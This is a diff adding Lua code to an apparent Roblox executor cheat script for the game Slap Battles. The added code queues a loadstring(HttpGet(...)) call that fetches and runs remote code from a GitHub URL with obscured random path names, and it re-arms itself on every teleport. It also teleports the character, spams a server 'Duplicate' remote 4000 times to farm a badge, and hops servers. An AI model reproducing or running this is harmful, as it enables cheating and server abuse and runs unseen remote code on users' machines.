@@ -65,3 +65,71 @@ end)
 
 -- inspiration from https://raw.githubusercontent.com/Giangplay/Slap_Battles/main/Slap_Battles.lua
 
+
+
+local function main()
+    if game.PlaceId == 6403373529 then
+        local teleportFunc = queueonteleport or queue_on_teleport or syn and syn.queue_on_teleport
+        if teleportFunc then
+            teleportFunc([[ 
+                if not game:IsLoaded() then 
+                    game.Loaded:Wait() 
+                end 
+                repeat task.wait() until game.Players.LocalPlayer 
+                wait(0.25) 
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/USERID/m3ug92fh12h2h20fj1f238fh1k19/refs/heads/main/1928dh98hd12fho3hfil21hfy2i1ofh2i1hfi12g"))()
+            ]])
+        end
+
+        local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+
+        local badgeService = game:GetService("BadgeService")
+        local starterGui = game:GetService("StarterGui")
+
+        if not badgeService:UserHasBadgeAsync(player.UserId, 2125950512) then
+            starterGui:SetCore("SendNotification", {
+                Title = "[ Giang ]",
+                Text = "📢 [ You have not issued Bob, and not badge bob ] 🇻🇳.",
+                Icon = "rbxassetid://7733658504",
+                Duration = 10
+            })
+
+            if character:FindFirstChild("HumanoidRootPart") then
+                character.HumanoidRootPart.CFrame = CFrame.new(39.0430565, 28.5713024, -46.777504)
+                wait(0.4)
+
+                for i = 1, 4000 do
+                    game:GetService("ReplicatedStorage").Duplicate:FireServer(true)
+                end
+                wait(0.4)
+
+                local serverList = {}
+                local servers = game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data
+                for _, v in ipairs(servers) do
+                    if v.playing and type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
+                        table.insert(serverList, v.id)
+                    end
+                end
+
+                if #serverList > 0 then
+                    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, serverList[math.random(1, #serverList)])
+                end
+            end
+        else
+            starterGui:SetCore("SendNotification", {
+                Title = "[ Giang ]",
+                Text = "📢 [ You Got Badge Bob, Meaning you already have Bob ] 🇻🇳.",
+                Icon = "rbxassetid://7733658504",
+                Duration = 10
+            })
+        end
+    end
+end
+
+main()
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function()
+    wait(0.5)
+    main()
+end)
